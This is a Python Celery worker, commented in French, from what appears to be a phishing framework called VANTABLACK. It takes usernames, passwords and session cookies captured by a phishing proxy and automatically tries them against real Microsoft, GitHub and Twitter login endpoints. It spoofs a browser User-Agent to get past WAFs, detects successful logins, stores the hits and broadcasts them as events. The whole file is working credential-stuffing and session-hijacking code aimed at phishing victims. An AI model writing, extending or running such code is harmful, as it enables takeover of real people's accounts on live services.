"""
Credential Reuse Worker
=======================

Worker Celery dédié à la réutilisation de credentials capturés.
Prend en charge :
  - Test de connexion par couple username/password (POST formulaire)
  - Replay de cookies/session tokens sur des cibles externes
  - Persistence des succès dans captures/credential_reuse_results.jsonl
  - Publication d'événements 'credential_reuse_success' vers le bus

Dépendance : httpx (présent dans requirements-v4.txt)
"""

import json
import logging
import re
from dataclasses import asdict, dataclass, field
from datetime import datetime
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple

import httpx
from typing_extensions import Self

from core.event_bus import app, publish_event

# ---------------------------------------------------------------------------
# Configuration du logger
# ---------------------------------------------------------------------------
logger = logging.getLogger("CredentialReuseWorker")

# ---------------------------------------------------------------------------
# Chemins et constantes
# ---------------------------------------------------------------------------

# Dossier racine du projet VANTABLACK
_PROJECT_ROOT = Path(__file__).resolve().parent.parent

# Fichier de persistence des réutilisations réussies (JSONL)
_RESULTS_JSONL = _PROJECT_ROOT / "captures" / "credential_reuse_results.jsonl"

# User-Agent standardisé pour éviter d'être bloqué par les WAF simples
_DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# Timeout global pour les requêtes httpx (secondes)
_HTTP_TIMEOUT = 15.0

# ---------------------------------------------------------------------------
# Indicateurs de succès post-authentification
# Ces mots-clés / motifs sont recherchés dans le corps HTML / JSON de la
# réponse après tentative de connexion ou replay de cookie.
# ---------------------------------------------------------------------------
_POST_AUTH_INDICATORS: list[str] = [
    # Français
    "déconnexion",
    "deconnexion",
    "se déconnecter",
    "se deconnecter",
    "mon compte",
    "mon profil",
    "profil",
    "tableau de bord",
    "dashboard",
    "espace personnel",
    "bienvenue",
    "bonjour",
    # Anglais
    "logout",
    "log out",
    "sign out",
    "sign-out",
    "my account",
    "my profile",
    "profile",
    "welcome",
    "dashboard",
    "home /",
    "user menu",
    "account settings",
    # Tokens / patterns JSON typiques
    '"authenticated":true',
    '"isLoggedIn":true',
    '"loggedIn":true',
    '"success":true',
    '"status":"ok"',
    '"access_token"',
    '"user_id"',
]

# ---------------------------------------------------------------------------
# Services cibles par défaut pour la réutilisation.
# Chaque entrée décrit :
#   - name       : nom humain du service
#   - login_url  : URL du formulaire de connexion (endpoint POST)
#   - username_field : nom du champ username/email dans le formulaire
#   - password_field : nom du champ password dans le formulaire
#   - verify_url : URL à visiter APRES connexion pour valider la session
#                  (utile pour le cookie replay + la vérification post-login)
# ---------------------------------------------------------------------------
DEFAULT_TARGET_SERVICES: list[dict[str, str]] = [
    {
        "name": "Microsoft",
        "login_url": "https://login.microsoftonline.com/common/login",
        "username_field": "loginfmt",
        "password_field": "passwd",
        "verify_url": "https://www.office.com/",
    },
    {
        "name": "Github",
        "login_url": "https://github.com/session",
        "username_field": "login",
        "password_field": "password",
        "verify_url": "https://github.com/settings/profile",
    },
    {
        "name": "Twitter",
        "login_url": "https://twitter.com/i/api/2/onboarding/task.json",
        "username_field": "username",
        "password_field": "password",
        "verify_url": "https://twitter.com/home",
    },
]


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------
@dataclass
class ReuseResult:
    """
    Structure décrivant le résultat d'une tentative de réutilisation.
    Est sérialisée dans le fichier JSONL et dans l'événement Celery.
    """

    # Identité testée
    username: str
    service_name: str
    # Origine du credential capturé (phishlet source)
    original_phishlet: str | None = None
    # Mode utilisé : "credentials" (login/password) ou "cookies" (replay)
    mode: str = "credentials"
    # Succès ou échec
    success: bool = False
    # Code HTTP retourné par la cible
    http_status: int | None = None
    # Indicateur(s) de succès post-auth détecté(s)
    matched_indicators: list[str] = field(default_factory=list)
    # URL finale observée (après redirects)
    final_url: str | None = None
    # Message d'erreur éventuel
    error: str | None = None
    # Timestamp ISO
    attempted_at: str = field(default_factory=lambda: datetime.now().isoformat())

    def to_jsonline(self) -> str:
        """Sérialisation en une ligne JSON valide pour le fichier .jsonl."""
        return json.dumps(asdict(self), ensure_ascii=False)


# ---------------------------------------------------------------------------
# Worker principal
# ---------------------------------------------------------------------------
class CredentialReuseWorker:
    """
    Classe d'orchestration des tests de réutilisation.
    Encapsule la logique HTTP (httpx) et la détection de succès post-auth.

    Usage typique :
        worker = CredentialReuseWorker()
        result = worker.test_login_with_credentials(
            target_url="https://example.com/login",
            username="toto@corp.com",
            password="P@ssw0rd!",
        )
    """

    def __init__(
        self,
        user_agent: str = _DEFAULT_USER_AGENT,
        timeout: float = _HTTP_TIMEOUT,
        post_auth_indicators: list[str] | None = None,
    ) -> None:
        """
        Initialise le worker.

        :param user_agent: User-Agent à utiliser pour toutes les requêtes
        :param timeout: Timeout global par requête (en secondes)
        :param post_auth_indicators: Liste de motifs (strings) à chercher
                                     dans le corps de réponse pour déterminer
                                     si l'authentification a réussi.
        """
        self.user_agent = user_agent
        self.timeout = timeout
        self.post_auth_indicators = post_auth_indicators or list(
            _POST_AUTH_INDICATORS
        )

        # Création du dossier captures/ si absent (première exécution)
        _RESULTS_JSONL.parent.mkdir(parents=True, exist_ok=True)

        # Client httpx persistant : garde les cookies entre requêtes pour
        # pouvoir enchaîner POST login -> GET verify_url.
        self._client = httpx.Client(
            headers={"User-Agent": self.user_agent},
            timeout=self.timeout,
            follow_redirects=True,
            verify=True,
        )

    # ------------------------------------------------------------------
    # API publique
    # ------------------------------------------------------------------

    def test_login_with_credentials(
        self,
        target_url: str,
        username: str,
        password: str,
        username_field: str = "username",
        password_field: str = "password",
        extra_form_data: dict[str, Any] | None = None,
        verify_url: str | None = None,
    ) -> ReuseResult:
        """
        Tente une connexion par formulaire POST (application/x-www-form-urlencoded).

        Process :
          1. Optionnellement, GET sur la page de login pour récupérer
             les champs CSRF / hidden (non implémenté ici par simplicité,
             on laisse extra_form_data injecter ces champs).
          2. POST les credentials sur target_url.
          3. Si verify_url est fourni, GET cette URL pour confirmer la session.
          4. Analyse le corps de la réponse finale pour détecter les
             indicateurs post-auth.

        :param target_url: URL du formulaire de login (endpoint POST)
        :param username: Identifiant à tester
        :param password: Mot de passe à tester
        :param username_field: Nom du champ HTML pour l'identifiant
        :param password_field: Nom du champ HTML pour le mot de passe
        :param extra_form_data: Champs cachés / CSRF à ajouter au POST
        :param verify_url: URL de vérification post-login (ex: /dashboard)
        :return: ReuseResult détaillé
        """
        result = ReuseResult(
            username=username,
            service_name=target_url,
            mode="credentials",
        )

        # Construction du payload du formulaire
        form_data: dict[str, Any] = {
            username_field: username,
            password_field: password,
        }
        if extra_form_data:
            form_data.update(extra_form_data)

        try:
            logger.info(
                f"[REUSE_WORKER] POST login -> {target_url} "
                f"(user={username}, field_user={username_field}, field_pass={password_field})"
            )

            # --- Étape 1 : POST du formulaire ---
            login_resp = self._client.post(target_url, data=form_data)
            result.http_status = login_resp.status_code
            result.final_url = str(login_resp.url)

            logger.debug(
                f"[REUSE_WORKER] POST login status={login_resp.status_code}, "
                f"len={len(login_resp.content)}, final_url={result.final_url}"
            )

            # --- Étape 2 : GET verify_url pour confirmer la session ---
            final_body = login_resp.text
            if verify_url and login_resp.status_code in (200, 301, 302):
                logger.debug(
                    f"[REUSE_WORKER] GET verify_url -> {verify_url} pour confirmer la session..."
                )
                verify_resp = self._client.get(verify_url)
                result.http_status = verify_resp.status_code
                result.final_url = str(verify_resp.url)
                final_body = verify_resp.text
                logger.debug(
                    f"[REUSE_WORKER] verify_url status={verify_resp.status_code}, "
                    f"len={len(verify_resp.content)}"
                )

            # --- Étape 3 : Détection des indicateurs post-auth ---
            result.success, result.matched_indicators = self._detect_post_auth(
                body=final_body, status=result.http_status
            )

        except httpx.HTTPError as exc:
            result.error = f"HTTPError: {exc}"
            logger.warning(
                f"[REUSE_WORKER] Échec HTTP sur {target_url} (user={username}): {exc}"
            )
        except Exception as exc:
            result.error = f"UnexpectedError: {exc}"
            logger.exception(
                f"[REUSE_WORKER] Exception inattendue sur {target_url} (user={username})"
            )

        return result

    def test_cookie_replay(
        self,
        target_url: str,
        cookie_dict: dict[str, str],
    ) -> ReuseResult:
        """
        Rejoue un dictionnaire de cookies sur target_url pour vérifier
        si la session est toujours valide.

        :param target_url: URL typique d'un utilisateur authentifié
                           (ex: https://app.com/dashboard)
        :param cookie_dict: Dict {cookie_name: cookie_value} à injecter
        :return: ReuseResult détaillé
        """
        username = cookie_dict.get("username") or cookie_dict.get("user") or ""
        result = ReuseResult(
            username=username,
            service_name=target_url,
            mode="cookies",
        )

        try:
            logger.info(
                f"[REUSE_WORKER] Cookie replay -> {target_url} "
                f"(cookies={list(cookie_dict.keys())}, UA={self.user_agent[:50]}...)"
            )

            # Injection des cookies dans le client httpx
            for name, value in cookie_dict.items():
                # Certains cookies sont extraits de Set-Cookie et contiennent
                # des métadonnées ; on ne garde que les paires k/v string.
                if isinstance(value, str):
                    self._client.cookies.set(name, value)

            # GET sur target_url avec les cookies et le User-Agent configurés
            resp = self._client.get(target_url)
            result.http_status = resp.status_code
            result.final_url = str(resp.url)

            logger.debug(
                f"[REUSE_WORKER] Cookie replay status={resp.status_code}, "
                f"len={len(resp.content)}, final_url={result.final_url}"
            )

            # Détection post-auth
            result.success, result.matched_indicators = self._detect_post_auth(
                body=resp.text, status=resp.status_code
            )

        except httpx.HTTPError as exc:
            result.error = f"HTTPError: {exc}"
            logger.warning(
                f"[REUSE_WORKER] Échec HTTP cookie replay {target_url}: {exc}"
            )
        except Exception as exc:
            result.error = f"UnexpectedError: {exc}"
            logger.exception(
                f"[REUSE_WORKER] Exception inattendue cookie replay {target_url}"
            )

        return result

    def persist_result(self, result: ReuseResult) -> None:
        """
        Persiste un résultat dans le fichier JSONL
        captures/credential_reuse_results.jsonl.

        Une ligne = un résultat (JSON Lines).
        """
        try:
            with _RESULTS_JSONL.open("a", encoding="utf-8") as fp:
                fp.write(result.to_jsonline() + "\n")
            logger.debug(
                f"[REUSE_WORKER] Résultat persisté dans {_RESULTS_JSONL}: "
                f"success={result.success} service={result.service_name}"
            )
        except OSError as exc:
            logger.error(
                f"[REUSE_WORKER] Impossible d'écrire dans {_RESULTS_JSONL}: {exc}"
            )

    # ------------------------------------------------------------------
    # Interne
    # ------------------------------------------------------------------

    def _detect_post_auth(
        self, body: str, status: int | None
    ) -> tuple[bool, list[str]]:
        """
        Détermine si une réponse correspond à un état "authentifié".

        Critères (tous doivent être réunis) :
          1. Code HTTP 200 OK
          2. AU MOINS un indicateur post-auth présent dans le corps
             (recherche insensible à la casse)

        :param body: Corps HTML / JSON de la réponse
        :param status: Code HTTP
        :return: (success, matched_indicators_list)
        """
        matched: list[str] = []

        # Critère 1 : on exige un 200. On relaxe si un 302 nous a
        # redirigés vers un 200 (follow_redirects=True donc status final 200).
        if status != 200:
            return False, matched

        # Critère 2 : recherche des indicateurs
        lowered_body = body.lower()
        for indicator in self.post_auth_indicators:
            if indicator.lower() in lowered_body:
                matched.append(indicator)

        success = len(matched) > 0
        return success, matched

    def close(self) -> None:
        """Libère proprement le client httpx."""
        try:
            self._client.close()
        except Exception:
            pass

    def __enter__(self) -> Self:
        return self

    def __exit__(self, exc_type, exc, tb) -> None:
        self.close()


# ---------------------------------------------------------------------------
# Tâche Celery exposée sur le bus
# ---------------------------------------------------------------------------
@app.task(name='vantablack.events.credential_captured')
def attempt_credential_reuse(data: dict):
    """
    Handles the 'credential_captured' event and attempts to reuse
    the credentials on other platforms (mode async Celery).

    Payable 'data' typique (émis par engine/proxy.py):
        {
            "phishlet_name": "Office365",
            "path": "/login",
            "captured_data": {
                "username": "...", "password": "...",
                # OU cookies / tokens
                "cookies": {"ESTSAUTHPERSISTENT": "...", ...}
            },
            "request_info": {...},
            "timestamp": "..."
        }

    Comportements :
      - Si username + password présents : boucle sur DEFAULT_TARGET_SERVICES
        et appelle test_login_with_credentials() pour chacun.
      - Si cookies présents : appelle test_cookie_replay() sur les verify_url
        des services cibles.
      - Chaque succès publie 'credential_reuse_success' et est persisté
        dans le fichier JSONL.
    """
    captured_data = data.get('captured_data', {}) or {}
    original_phishlet = data.get('phishlet_name')

    username = captured_data.get('username') or captured_data.get('email')
    password = captured_data.get('password')
    cookies = captured_data.get('cookies') or captured_data.get('tokens') or {}

    # Rien à tester : sortie anticipée
    if not (username and password) and not cookies:
        logger.info(
            "[REUSE_WORKER] Événement reçu mais ni credentials ni cookies "
            "exploitables. Abandon."
        )
        return

    logger.info(
        f"[REUSE_WORKER] Réception credentials pour user='{username}'. "
        f"Tentative de réutilisation sur {len(DEFAULT_TARGET_SERVICES)} services..."
    )

    # Construction du worker et exécution des tests
    with CredentialReuseWorker() as worker:
        for service in DEFAULT_TARGET_SERVICES:
            service_name = service["name"]
            login_url = service["login_url"]
            username_field = service.get("username_field", "username")
            password_field = service.get("password_field", "password")
            verify_url = service.get("verify_url")

            # --- Cas 1 : test par couple username/password ---
            if username and password:
                logger.info(
                    f"[REUSE_WORKER] ---> Test password sur {service_name} pour '{username}'"
                )
                result = worker.test_login_with_credentials(
                    target_url=login_url,
                    username=username,
                    password=password,
                    username_field=username_field,
                    password_field=password_field,
                    verify_url=verify_url,
                )
                result.service_name = service_name
                result.original_phishlet = original_phishlet

            # --- Cas 2 : test par cookie replay ---
            elif cookies and isinstance(cookies, dict) and verify_url:
                logger.info(
                    f"[REUSE_WORKER] ---> Test cookie replay sur {service_name} ({len(cookies)} cookies)"
                )
                result = worker.test_cookie_replay(
                    target_url=verify_url,
                    cookie_dict=cookies,
                )
                result.service_name = service_name
                result.original_phishlet = original_phishlet
                if username:
                    result.username = username
            else:
                continue

            # Persistance systématique (succès comme échec) pour audit
            worker.persist_result(result)

            if result.success:
                log_msg = (
                    f"[REUSE_WORKER] 🟢 SUCCES ! Credentials pour '{result.username}' "
                    f"sont VALIDES sur {service_name} "
                    f"(matched={result.matched_indicators}, url={result.final_url})"
                )
                logger.warning(log_msg)
                publish_event('credential_reuse_success', {
                    "username": result.username,
                    "service": service_name,
                    "original_phishlet": original_phishlet,
                    "mode": result.mode,
                    "matched_indicators": result.matched_indicators,
                    "final_url": result.final_url,
                    "http_status": result.http_status,
                    "attempted_at": result.attempted_at,
                })
            else:
                reason = (
                    f"status={result.http_status}"
                    + (f", error={result.error}" if result.error else "")
                    + (", no indicators matched" if not result.matched_indicators else "")
                )
                logger.info(
                    f"[REUSE_WORKER] 🔴 Echec sur {service_name} pour '{result.username}': {reason}"
                )


# To run this worker:
# celery -A workers.credential_reuse_worker worker --loglevel=info
